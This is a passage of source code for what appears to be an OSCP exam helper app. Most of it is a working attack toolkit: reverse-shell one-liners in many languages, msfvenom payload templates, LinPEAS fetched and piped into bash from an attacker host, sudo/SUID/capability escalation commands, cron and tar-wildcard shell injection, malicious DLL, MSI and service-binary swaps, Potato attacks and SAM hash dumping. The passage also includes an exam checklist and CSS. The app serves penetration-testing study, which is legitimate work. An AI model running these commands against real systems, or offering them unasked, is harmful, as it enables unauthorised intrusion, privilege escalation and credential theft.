    { action: "Anonymous bind", cmd: (t) => `ldapsearch -x -H ldap://${t} -b "" -s base namingContexts\nldapsearch -x -H ldap://${t} -b "DC=domain,DC=local" "(objectClass=*)" 2>/dev/null | head -50`, check: "Anonymous access?", critical: true },
    { action: "Enum users (anon)", cmd: (t) => `ldapsearch -x -H ldap://${t} -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName description memberOf | grep -E '(sAMAccountName|description|memberOf):'`, check: "Users? Descriptions with passwords?" },
    { action: "Enum with creds", cmd: (t) => `ldapsearch -x -H ldap://${t} -D 'user@domain.local' -w 'password' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName memberOf description\n\n# Or use windapsearch:\npython3 windapsearch.py -d domain.local --dc-ip ${t} -u user -p password --users --groups --computers`, check: "Full domain enum via LDAP" },
    { action: "Nmap scripts", cmd: (t) => `nmap --script ldap-rootdse,ldap-search,ldap-brute -p389 ${t}`, check: "Domain info? Base DN?" },
  ]},
  2049: { service: "NFS", icon: "📂", priority: "HIGH", steps: [
    { action: "List exports", cmd: (t) => `showmount -e ${t}\nnmap --script nfs-ls,nfs-showmount,nfs-statfs -p2049 ${t}`, check: "Mountable shares?", critical: true },
    { action: "Mount & enumerate", cmd: (t) => `mkdir /tmp/nfs && mount -t nfs ${t}:/share /tmp/nfs -o nolock\nls -la /tmp/nfs/\nfind /tmp/nfs/ -type f -name '*.txt' -o -name '*.conf' -o -name '*.bak' -o -name 'id_rsa' -o -name '*.kdbx' 2>/dev/null`, check: "SSH keys? Configs? Creds?" },
    { action: "UID spoof", cmd: () => `# If permission denied — create user with matching UID:\nuseradd -u TARGET_UID tempuser\nsu tempuser\n# Now access files as that user\n\n# Or use nfspysh:\nnfspysh -o server=${"{"}TARGET{"}"}:/share`, check: "Bypass no_root_squash?" },
  ]},
  27017: { service: "MongoDB", icon: "🍃", priority: "MEDIUM", steps: [
    { action: "No-auth access", cmd: (t) => `mongosh --host ${t} --port 27017\n# Or: mongo ${t}:27017\n\n# In shell:\nshow dbs\nuse admin\ndb.getUsers()\nshow collections`, check: "Unauthenticated access?", critical: true },
    { action: "Dump databases", cmd: (t) => `mongodump --host ${t} --port 27017 --out /tmp/mongodump/\n\n# Or enumerate manually:\n# db.COLLECTION.find().pretty()`, check: "Creds? Sensitive data?" },
  ]},
};

// ─── PRIV ESC DECISION TREES ───
const PRIVESC = {
  linux: [
    { id: "enum", label: "Run LinPEAS + pspy", cmd: (ip) => `# Download and run (from attacker http server):
curl http://${ip||"LHOST"}/linpeas.sh | bash | tee linpeas.txt

# Or transfer first:
wget http://${ip||"LHOST"}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.txt

# pspy (hidden cron/processes):
wget http://${ip||"LHOST"}/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy -pf -i 1000

# linux-smart-enumeration:
curl http://${ip||"LHOST"}/lse.sh | bash`, q: "Run automated enumeration FIRST", critical: true,
      yes: "Read output carefully — look for highlighted (RED/YELLOW) items",
      no: "If can't transfer files, proceed to manual checks below" },
    { id: "sudo", label: "sudo -l", cmd: () => `sudo -l`, q: "Sudo entries found?", critical: true,
      yes: `Check EACH binary at https://gtfobins.github.io/\nCommon instant wins:`,
      yesCmd: () => `sudo vim -c ':!/bin/bash'\nsudo find / -exec /bin/sh \\;\nsudo python3 -c 'import os;os.system("/bin/bash")'\nsudo env /bin/bash\nsudo awk 'BEGIN {system("/bin/bash")}'\nsudo less /etc/shadow  # then !bash\nsudo nmap --interactive  # then !sh\nsudo tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/bash`,
      no: "Continue to SUID" },
    { id: "suid", label: "SUID Binaries", cmd: () => `find / -perm -4000 -type f 2>/dev/null`, q: "Unusual SUID?", critical: true,
      yes: "Check GTFOBins SUID section. Custom binary? Reverse engineer it.",
      yesCmd: () => `# Analyze custom SUID:\nstrings /path/to/suid_binary\nstrace /path/to/suid_binary 2>&1\nltrace /path/to/suid_binary 2>&1\n\n# If it calls another binary without full path (PATH hijack):\nexport PATH=/tmp:$PATH\necho '#!/bin/bash\\nbash -p' > /tmp/called_binary\nchmod +x /tmp/called_binary`,
      no: "Continue to Capabilities" },
    { id: "caps", label: "Capabilities", cmd: () => `getcap -r / 2>/dev/null`, q: "Capabilities set?",
      yes: "cap_setuid on python/perl/ruby = instant root",
      yesCmd: () => `# Python cap_setuid:\npython3 -c 'import os;os.setuid(0);os.system("/bin/bash")'\n# Perl:\nperl -e 'use POSIX;setuid(0);exec "/bin/bash"'\n# Ruby:\nruby -e 'Process::Sys.setuid(0);exec "/bin/bash"'`,
      no: "Continue to Cron" },
    { id: "cron", label: "Cron Jobs", cmd: () => `cat /etc/crontab\nls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/\ncrontab -l 2>/dev/null\nfor user in $(cut -d: -f1 /etc/passwd); do crontab -l -u $user 2>/dev/null | grep -v '^#'; done`, q: "Writable cron scripts? Wildcard injection?",
      yes: "Inject reverse shell or exploit wildcards",
      yesCmd: (ip) => `# Writable script:\necho 'bash -i >& /dev/tcp/${ip||"LHOST"}/4444 0>&1' >> /path/to/cron_script.sh\n\n# Tar wildcard injection (if cron runs: tar czf backup.tar.gz *):\necho '' > '--checkpoint=1'\necho '' > '--checkpoint-action=exec=sh shell.sh'\necho 'bash -i >& /dev/tcp/${ip||"LHOST"}/4444 0>&1' > shell.sh`,
      no: "Continue to pspy" },
    { id: "pspy", label: "Hidden Processes", cmd: () => `# Transfer pspy to target:\n./pspy64 -pf -i 1000\n# Watch for 3-5 minutes`, q: "Root processes using writable files/paths?",
      yes: "Modify writable files called by root processes",
      no: "Continue to passwords" },
    { id: "pass", label: "Password Hunt", cmd: () => `grep -rli 'password\\|passwd\\|secret\\|credential' /etc/ /opt/ /var/ /home/ /tmp/ /srv/ 2>/dev/null\nfind / \\( -name '*.bak' -o -name '*.old' -o -name '*.conf' -o -name '*.cfg' -o -name '*.db' -o -name '*.sqlite*' -o -name '.env' -o -name 'wp-config*' -o -name 'config.php' \\) 2>/dev/null | head -40\ncat /home/*/.bash_history /root/.bash_history 2>/dev/null\nls -la /home/*/.ssh/ 2>/dev/null`, q: "Found credentials?", critical: true,
      yes: "Try su, SSH, or reuse on other services/machines",
      no: "Continue to network" },
    { id: "docker", label: "Docker / LXD Group", cmd: () => `id\ngroups\nls -la /var/run/docker.sock 2>/dev/null\nwhich docker 2>/dev/null`, q: "User in docker/lxd group?", critical: true,
      yes: "INSTANT ROOT — mount host filesystem!",
      yesCmd: () => `# ─── DOCKER GROUP ───\ndocker run -v /:/mnt --rm -it alpine chroot /mnt bash\n# You are now root on the host!\n\n# Or just read files:\ndocker run -v /:/mnt --rm alpine cat /mnt/etc/shadow\ndocker run -v /:/mnt --rm alpine cat /mnt/root/proof.txt\n\n# ─── LXD GROUP ───\n# 1. On attacker — build alpine image:\ngit clone https://github.com/saghul/lxd-alpine-builder\ncd lxd-alpine-builder && sudo bash build-alpine\n# Transfer .tar.gz to target\n\n# 2. On target:\nlxc image import alpine.tar.gz --alias myimage\nlxc init myimage mycontainer -c security.privileged=true\nlxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true\nlxc start mycontainer\nlxc exec mycontainer /bin/sh\n# Host root FS at /mnt/root/`,
      no: "Continue to internal services" },
    { id: "net", label: "Internal Services", cmd: () => `ss -tlnp\nip a && ip route\narp -a\ncat /etc/hosts`, q: "Services on 127.0.0.1 only?",
      yes: "Port forward and attack internal services",
      yesCmd: (ip) => `# SSH forward:\nssh -L 8080:127.0.0.1:8080 user@${ip||"TARGET"}\n# Chisel:\n# Attacker: ./chisel server --reverse -p 8000\n# Target: ./chisel client ${ip||"LHOST"}:8000 R:8080:127.0.0.1:8080`,
      no: "Continue to kernel exploits" },
    { id: "kernel", label: "Kernel Exploit", cmd: () => `uname -a && cat /etc/os-release\n./linux-exploit-suggester.sh`, q: "Old kernel with known CVE?",
      yes: "Compile exploit, transfer, run. LAST RESORT.",
      no: "Re-enumerate. Run linpeas again. Check EVERYTHING." },
  ],
  windows: [
    { id: "enum", label: "Run WinPEAS + Seatbelt", cmd: (ip) => `# Download and run:
certutil -urlcache -split -f http://${ip||"LHOST"}/winPEASx64.exe C:\\Temp\\winpeas.exe
C:\\Temp\\winpeas.exe | tee C:\\Temp\\winpeas.txt

# PowerUp:
powershell -ep bypass -c ". C:\\Temp\\PowerUp.ps1; Invoke-AllChecks"

# Seatbelt:
C:\\Temp\\Seatbelt.exe -group=all

# SharpUp:
C:\\Temp\\SharpUp.exe audit`, q: "Run automated enumeration FIRST", critical: true,
      yes: "Read output carefully — check each finding",
      no: "If can't transfer, proceed to manual checks below" },
    { id: "whoami", label: "Check Privileges", cmd: () => `whoami /all\nwhoami /priv\nnet user %username%`, q: "SeImpersonate or SeAssignPrimaryToken?", critical: true,
      yes: "POTATO ATTACK! This is your fastest path to SYSTEM.",
      yesCmd: () => `# GodPotato (works on all modern Windows):\n.\\GodPotato.exe -cmd "cmd /c C:\\Temp\\nc.exe LHOST LPORT -e cmd.exe"\n\n# PrintSpoofer:\n.\\PrintSpoofer.exe -c "cmd /c C:\\Temp\\nc.exe LHOST LPORT -e cmd.exe"\n\n# JuicyPotatoNG:\n.\\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c C:\\Temp\\nc.exe LHOST LPORT -e cmd.exe"\n\n# SweetPotato:\n.\\SweetPotato.exe -p C:\\Temp\\nc.exe -a "LHOST LPORT -e cmd.exe"`,
      no: "Continue to services" },
    { id: "svc", label: "Service Misconfigs", cmd: () => `# Unquoted paths:\nwmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows"\n\n# Weak permissions:\nicacls "C:\\path\\to\\service.exe"\n\n# PowerUp:\npowershell -ep bypass -c ". .\\PowerUp.ps1; Invoke-AllChecks"`, q: "Writable service? Unquoted path?", critical: true,
      yes: "Replace binary or abuse unquoted path",
      yesCmd: () => `# Writable service binary:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=4444 -f exe -o evil.exe\ncopy evil.exe "C:\\path\\to\\service.exe"\nsc stop VulnService && sc start VulnService\n\n# Unquoted path "C:\\Program Files\\Vuln App\\service.exe":\ncopy evil.exe "C:\\Program Files\\Vuln.exe"`,
      no: "Continue to DLL hijacking" },
    { id: "dll", label: "DLL Hijacking", cmd: () => `# Find missing DLLs (Process Monitor or manual):\n# 1. Check service/app binary with PowerUp:\npowershell -ep bypass -c ". .\\PowerUp.ps1; Find-ProcessDLLHijack; Find-PathDLLHijack"\n\n# 2. Manual — check writable PATH dirs:\necho %PATH%\nicacls "C:\\Path\\Dir"   # Look for (M) or (F) for your user\n\n# 3. Check what DLLs a service loads:\n# Use: procmon.exe with filter: Result=NAME NOT FOUND, Path ends .dll`, q: "Missing DLL in writable path?", critical: true,
      yes: "Drop malicious DLL → restart service = SYSTEM!",
      yesCmd: () => `# Generate malicious DLL:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=4444 -f dll -o hijack.dll\n\n# Copy to writable PATH dir with the expected DLL name:\ncopy hijack.dll "C:\\Writable\\Path\\missing.dll"\n\n# Restart the service:\nsc stop VulnService && sc start VulnService\n# Or reboot if needed: shutdown /r /t 0`,
      no: "Continue to scheduled tasks" },
    { id: "tasks", label: "Scheduled Tasks", cmd: () => `schtasks /query /fo LIST /v\n# Check writable task scripts:\nicacls "C:\\path\\to\\script.bat"`, q: "Writable task scripts?",
      yes: "Inject reverse shell into the task script",
      no: "Continue to AlwaysInstallElevated" },
    { id: "aie", label: "AlwaysInstallElevated", cmd: () => `reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul`, q: "Both keys = 1?",
      yes: "MSI payload runs as SYSTEM!",
      yesCmd: () => `msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=4444 -f msi -o shell.msi\n# On target:\nmsiexec /quiet /qn /i shell.msi`,
      no: "Continue to stored credentials" },
    { id: "creds", label: "Credential Search", cmd: () => `cmdkey /list\ndir /s /b C:\\Users\\*unattend* C:\\*sysprep* C:\\*Panther*\ntype C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul\nreg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon" 2>nul | findstr /i "DefaultPassword"\ndir /s /b C:\\*.kdbx C:\\*.config C:\\*.ini C:\\*.txt 2>nul | findstr /i /v "windows\\\\\\|program"`, q: "Found stored creds?", critical: true,
      yes: "runas or use creds for lateral movement",
      yesCmd: () => `runas /savecred /user:WORKGROUP\\Administrator cmd.exe\nimpacket-psexec user:password@TARGET`,
      no: "Continue to SAM" },
    { id: "sam", label: "SAM/SYSTEM Dump", cmd: () => `reg save HKLM\\SAM C:\\Temp\\SAM 2>nul\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM 2>nul\ndir C:\\Windows\\Repair\\SAM C:\\Windows\\System32\\config\\RegBack\\SAM 2>nul`, q: "SAM accessible?",
      yes: "Extract and crack hashes",
      yesCmd: () => `impacket-secretsdump -sam SAM -system SYSTEM LOCAL\nhashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`,
      no: "Continue to internal network" },
    { id: "net", label: "Internal Services", cmd: () => `netstat -ano | findstr LISTENING\nipconfig /all\narp -A\nroute print`, q: "Internal-only services?",
      yes: "Port forward with chisel and attack",
      no: "Run WinPEAS. Re-enumerate." },
  ],
};

// ─── REVERSE SHELLS ───
const SHELLS = [
  { l: "Bash", g: (h,p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1` },
  { l: "Bash (encoded)", g: (h,p) => `echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8=' | base64 -d | sed "s|HOST|${h}|;s|PORT|${p}|" | bash\n\n# Or just base64 encode your payload:\necho 'bash -i >& /dev/tcp/${h}/${p} 0>&1' | base64\n# Then: echo BASE64 | base64 -d | bash` },
  { l: "Python", g: (h,p) => `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
  { l: "NC -e", g: (h,p) => `nc -e /bin/sh ${h} ${p}` },
  { l: "NC mkfifo", g: (h,p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f` },
  { l: "PHP", g: (h,p) => `php -r '$s=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'` },
  { l: "PowerShell", g: (h,p) => `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${h}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($sb,0,$sb.Length)};$c.Close()"` },
  { l: "Socat", g: (h,p) => `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${h}:${p}` },
  { l: "Perl", g: (h,p) => `perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(${p},inet_aton("${h}")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'` },
  { l: "Ruby", g: (h,p) => `ruby -rsocket -e'f=TCPSocket.open("${h}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
];

const MSFVENOM = [
  { l: "Win x64 EXE", g: (h,p) => `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f exe -o rev.exe` },
  { l: "Win x86 EXE", g: (h,p) => `msfvenom -p windows/shell_reverse_tcp LHOST=${h} LPORT=${p} -f exe -o rev32.exe` },
  { l: "Linux ELF", g: (h,p) => `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f elf -o rev.elf` },
  { l: "PHP", g: (h,p) => `msfvenom -p php/reverse_php LHOST=${h} LPORT=${p} -o rev.php` },
  { l: "ASP", g: (h,p) => `msfvenom -p windows/shell_reverse_tcp LHOST=${h} LPORT=${p} -f asp -o rev.asp` },
  { l: "ASPX", g: (h,p) => `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f aspx -o rev.aspx` },
  { l: "JSP", g: (h,p) => `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${h} LPORT=${p} -o rev.jsp` },
  { l: "WAR", g: (h,p) => `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${h} LPORT=${p} -f war -o rev.war` },
  { l: "DLL", g: (h,p) => `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f dll -o rev.dll` },
  { l: "MSI", g: (h,p) => `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f msi -o rev.msi` },
  { l: "HTA", g: (h,p) => `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f hta-psh -o rev.hta` },
];

// ─── HASH ID ───
const HASH_PATTERNS = [
  { regex: /^[a-f0-9]{32}$/i, name: "MD5", jMode: "raw-md5", hMode: "0" },
  { regex: /^[a-f0-9]{32}:[a-f0-9]+$/i, name: "MD5 (salted)", jMode: "raw-md5", hMode: "10" },
  { regex: /^[a-f0-9]{40}$/i, name: "SHA-1", jMode: "raw-sha1", hMode: "100" },
  { regex: /^[a-f0-9]{64}$/i, name: "SHA-256", jMode: "raw-sha256", hMode: "1400" },
  { regex: /^[a-f0-9]{128}$/i, name: "SHA-512", jMode: "raw-sha512", hMode: "1700" },
  { regex: /^\$2[aby]?\$\d+\$.{53}$/i, name: "bcrypt", jMode: "bcrypt", hMode: "3200" },
  { regex: /^\$6\$/i, name: "SHA-512 Crypt (Linux)", jMode: "sha512crypt", hMode: "1800" },
  { regex: /^\$5\$/i, name: "SHA-256 Crypt", jMode: "sha256crypt", hMode: "7400" },
  { regex: /^\$1\$/i, name: "MD5 Crypt", jMode: "md5crypt", hMode: "500" },
  { regex: /^\$apr1\$/i, name: "Apache MD5", jMode: "md5crypt", hMode: "1600" },
  { regex: /^[a-f0-9]{32}$/i, name: "NTLM", jMode: "nt", hMode: "1000" },
  { regex: /^\$krb5tgs\$/i, name: "Kerberos TGS (Kerberoast)", jMode: "krb5tgs", hMode: "13100" },
  { regex: /^\$krb5asrep\$/i, name: "Kerberos AS-REP", jMode: "krb5asrep", hMode: "18200" },
  { regex: /^[a-f0-9]{32}:[a-f0-9]{32}$/i, name: "LM:NTLM", jMode: "lm", hMode: "3000" },
  { regex: /^.*::\w+:\w+:[a-f0-9]+:[a-f0-9]+$/i, name: "NTLMv2 (Net-NTLMv2)", jMode: "netntlmv2", hMode: "5600" },
];

// ─── CHECKLIST (OSCP+ 2025 format) ───
const CHECKLIST = {
  "AD Set (40 pts) — Assumed Breach": [
    "Domain user creds confirmed working",
    "Domain enumeration (users, groups, computers)",
    "BloodHound collection + analysis",
    "SYSVOL/NETLOGON searched for creds",
    "Kerberoasting attempted",
    "AS-REP Roasting attempted",
    "Password spraying with found patterns",
    "ACL abuse paths checked (BloodHound)",
    "Lateral movement to member servers",
    "Local SAM dumped on each compromised host",
    "Domain escalation path identified",
    "DCSync or Domain Admin achieved",
    "DC accessed — proof.txt captured",
    "All AD flags + screenshots documented",
  ],
  "Standalone 1 (20 pts)": [
    "Full port scan completed (-p-)",
    "Service versions identified",
    "Web directories brute-forced",
    "Vulnerability identified",
    "Initial foothold gained — local.txt",
    "Priv esc enumeration run",
    "Root/SYSTEM obtained — proof.txt",
    "All steps + screenshots documented",
  ],
  "Standalone 2 (20 pts)": [
    "Full port scan completed (-p-)",
    "Service versions identified",
    "Web directories brute-forced",
    "Vulnerability identified",
    "Initial foothold gained — local.txt",
    "Priv esc enumeration run",
    "Root/SYSTEM obtained — proof.txt",
    "All steps + screenshots documented",
  ],
  "Standalone 3 (20 pts)": [
    "Full port scan completed (-p-)",
    "Service versions identified",
    "Web directories brute-forced",
    "Vulnerability identified",
    "Initial foothold gained — local.txt",
    "Priv esc enumeration run",
    "Root/SYSTEM obtained — proof.txt",
    "All steps + screenshots documented",
  ],
  "Report & Submission": [
    "Report covers ALL exploited machines",
    "Each step includes: command + output + screenshot",
    "Proof screenshots show: whoami + hostname + flag",
    "Report is in PDF format",
    "PDF archived as .7z (no password)",
    "Filename: OSCP-OS-XXXXX-Exam-Report.7z",
    "Uploaded to upload.offsec.com",
    "MD5 hash verified after upload",
  ],
};

// ─── EXAM TIMER MILESTONES ───
const MILESTONES = [
  { hour: 0, label: "START — Nmap all machines. Begin AD enum." },
  { hour: 1, label: "AD enum should be running. BloodHound data collected." },
  { hour: 3, label: "AD: First lateral movement or credential harvest." },
  { hour: 5, label: "AD: Should have escalated or pivoted. Start standalones if stuck." },
  { hour: 8, label: "TARGET: 50+ pts locked in (AD + 1 standalone)." },
  { hour: 12, label: "HALFWAY — You should have 50-70 pts. Reassess strategy." },
  { hour: 16, label: "Focus on easy wins. Document everything." },
  { hour: 20, label: "STOP hacking. Start polishing report." },
  { hour: 23, label: "Final screenshots. Submit flags." },
  { hour: 23.75, label: "EXAM ENDS — Begin report writing (24h deadline)." },
];

// ━━━ CSS ━━━
const CSS = `
@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=Outfit:wght@400;500;600;700;800;900&display=swap');
:root{--b0:#06080b;--b1:#0b0e13;--b2:#111519;--b3:#191e26;--b4:#222831;--bd:#272e38;--bd2:#333c4a;--t0:#f3f5f7;--t1:#b3bcc8;--t2:#6c7585;--ac:#f97316;--acd:rgba(249,115,22,0.1);--g:#22c55e;--gd:rgba(34,197,94,0.08);--r:#ef4444;--rd:rgba(239,68,68,0.08);--y:#eab308;--b:#3b82f6;--cg:#6ee7b7;--m:'IBM Plex Mono',monospace;--s:'Outfit',system-ui,sans-serif}
*{margin:0;padding:0;box-sizing:border-box}body{background:var(--b0);color:var(--t1);font-family:var(--s)}
.app{min-height:100vh;display:flex;flex-direction:column}
.hdr{background:var(--b1);border-bottom:1px solid var(--bd);padding:12px 16px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap}
.logo{font-family:var(--s);font-weight:900;font-size:18px;letter-spacing:-0.5px;background:linear-gradient(135deg,#f97316,#ef4444,#ec4899);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.logo-sub{font-size:9px;color:var(--t2);letter-spacing:3px;text-transform:uppercase;font-weight:500}
.inps{display:flex;gap:5px;flex-wrap:wrap}
.inp{background:var(--b0);border:1px solid var(--bd);border-radius:4px;padding:6px 8px;color:var(--t0);font-size:11px;font-family:var(--m);outline:none;transition:border .2s}
.inp:focus{border-color:var(--ac)}.inp::placeholder{color:var(--t2)}
.tabs{display:flex;background:var(--b1);border-bottom:1px solid var(--bd);overflow-x:auto;padding:0 8px;gap:1px}
.tab{padding:8px 12px;font-size:11px;font-weight:600;font-family:var(--s);color:var(--t2);background:none;border:none;cursor:pointer;border-bottom:2px solid transparent;white-space:nowrap;transition:all .15s}
.tab:hover{color:var(--t1)}.tab.on{color:var(--ac);border-bottom-color:var(--ac);background:var(--b2)}
.main{flex:1;padding:14px 16px;max-width:1100px;margin:0 auto;width:100%}
.card{background:var(--b2);border:1px solid var(--bd);border-radius:8px;margin-bottom:8px;overflow:hidden}
.card-h{padding:10px 14px;display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:background .1s;gap:8px}
.card-h:hover{background:var(--b3)}
.pri{font-size:9px;padding:2px 7px;border-radius:8px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;flex-shrink:0}
.pri.CRITICAL{background:var(--rd);color:var(--r)}.pri.HIGH{background:var(--acd);color:var(--ac)}.pri.MEDIUM{background:rgba(234,179,8,.1);color:var(--y)}.pri.LOW{background:rgba(107,114,128,.12);color:var(--t2)}
.steps-wrap{border-top:1px solid var(--bd)}
.step{border-bottom:1px solid var(--bd)}.step:last-child{border-bottom:none}
.step-row{padding:8px 14px;display:flex;align-items:flex-start;gap:8px;cursor:pointer;transition:background .1s}
.step-row:hover{background:var(--b3)}
.snum{width:20px;height:20px;border-radius:50%;background:var(--b0);border:1px solid var(--bd);display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;color:var(--t2);flex-shrink:0;margin-top:1px;transition:all .15s}
.snum.crit{border-color:var(--ac);color:var(--ac);background:var(--acd)}
.snum.done{border-color:var(--g);color:#fff;background:var(--g)}
.s-act{font-size:12px;font-weight:600;color:var(--t0)}.s-chk{font-size:10px;color:var(--t2);margin-top:1px}
.s-exp{background:var(--b0);margin:0 10px 10px 42px;border-radius:5px;border:1px solid var(--bd);padding:8px 10px}
.cmd{font-family:var(--m);font-size:11px;color:var(--cg);white-space:pre-wrap;word-break:break-all;line-height:1.65}
.cp{background:var(--b3);border:1px solid var(--bd);border-radius:3px;padding:2px 8px;font-size:9px;color:var(--t2);cursor:pointer;font-family:var(--m);flex-shrink:0;transition:all .15s}
.cp:hover{border-color:var(--ac);color:var(--ac)}.cp.ok{border-color:var(--g);color:var(--g)}
.arrow{font-size:9px;color:var(--t2);transition:transform .2s;flex-shrink:0}.arrow.open{transform:rotate(90deg)}
.badge{font-size:9px;padding:2px 6px;border-radius:6px;font-weight:600}
.badge.g{background:var(--gd);color:var(--g)}.badge.o{background:var(--acd);color:var(--ac)}
.port-in{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:14px;margin-bottom:14px}
.port-in h3{color:var(--ac);font-size:12px;margin-bottom:8px;text-transform:uppercase;letter-spacing:1px}
.port-in textarea{width:100%;background:var(--b0);border:1px solid var(--bd);border-radius:5px;padding:8px 10px;color:var(--cg);font-family:var(--m);font-size:11px;min-height:50px;resize:vertical;outline:none}
.port-in textarea:focus{border-color:var(--ac)}
.port-in p{font-size:10px;color:var(--t2);margin-top:5px}
.ad-inputs{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:14px}
.phase{background:var(--b2);border:1px solid var(--bd);border-radius:8px;margin-bottom:10px;overflow:hidden}
.phase-h{padding:10px 14px;cursor:pointer;display:flex;align-items:center;gap:10px;transition:background .1s}
.phase-h:hover{background:var(--b3)}
.phase-num{width:26px;height:26px;border-radius:6px;background:var(--acd);border:1px solid var(--ac);display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:800;color:var(--ac);flex-shrink:0}
.phase-num.done{background:var(--g);border-color:var(--g);color:#fff}
.phase-title{font-size:13px;font-weight:700;color:var(--t0)}
.phase-desc{font-size:11px;color:var(--t2)}
.ost{display:inline-flex;gap:2px;background:var(--b0);border-radius:5px;padding:2px;border:1px solid var(--bd);margin-bottom:12px}
.osb{padding:5px 12px;font-size:10px;font-weight:600;border:none;border-radius:3px;cursor:pointer;font-family:var(--s);background:none;color:var(--t2);transition:all .15s}
.osb.on{background:var(--ac);color:#fff}
.tree-step{background:var(--b2);border:1px solid var(--bd);border-radius:8px;margin-bottom:8px;overflow:hidden}
.tree-h{padding:10px 14px;display:flex;align-items:center;gap:10px;cursor:pointer;transition:background .1s}
.tree-h:hover{background:var(--b3)}
.tree-exp{border-top:1px solid var(--bd);padding:12px 14px}
.branch{padding:8px 12px;border-radius:5px;margin-bottom:6px;font-size:11px;border-left:3px solid}
.branch.y{background:var(--gd);border-color:var(--g);color:var(--g)}
.branch.n{background:var(--rd);border-color:var(--r);color:var(--r)}
.branch .bl{font-weight:700;margin-bottom:3px}
.branch .bt{color:var(--t1);font-size:11px}
.gen-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:6px;margin-bottom:8px}
.gen-card{background:var(--b2);border:1px solid var(--bd);border-radius:6px;padding:8px 12px;cursor:pointer;transition:all .15s;display:flex;justify-content:space-between;align-items:center}
.gen-card:hover{border-color:var(--ac)}.gen-card.on{border-color:var(--ac);background:var(--acd)}
.gen-out{background:var(--b0);border:1px solid var(--bd);border-radius:6px;padding:12px;margin-bottom:16px;position:relative}
.sec-title{font-size:12px;font-weight:700;color:var(--ac);text-transform:uppercase;letter-spacing:1px;margin:16px 0 10px}
.chk-item{display:flex;align-items:center;gap:8px;padding:5px 8px;border-radius:4px;cursor:pointer;font-size:11.5px;transition:background .1s}
.chk-item:hover{background:var(--b3)}.chk-item.done{color:var(--g);opacity:.6;text-decoration:line-through}
.chk-box{width:15px;height:15px;border-radius:3px;border:1.5px solid var(--bd);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:9px;transition:all .15s}
.chk-box.on{background:var(--ac);border-color:var(--ac);color:#fff}
.prog{height:3px;background:var(--b3);border-radius:2px;margin-bottom:14px;overflow:hidden}
.prog-fill{height:100%;border-radius:2px;transition:width .3s}
.notes{width:100%;min-height:500px;background:var(--b0);border:1px solid var(--bd);border-radius:6px;padding:14px;color:var(--t0);font-family:var(--m);font-size:11.5px;line-height:1.8;resize:vertical;outline:none}
.notes:focus{border-color:var(--ac)}
.timer-bar{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:14px;margin-bottom:14px}
.timer-display{font-family:var(--m);font-size:28px;font-weight:700;color:var(--t0);text-align:center;margin-bottom:8px}
.timer-btns{display:flex;gap:6px;justify-content:center;margin-bottom:10px}
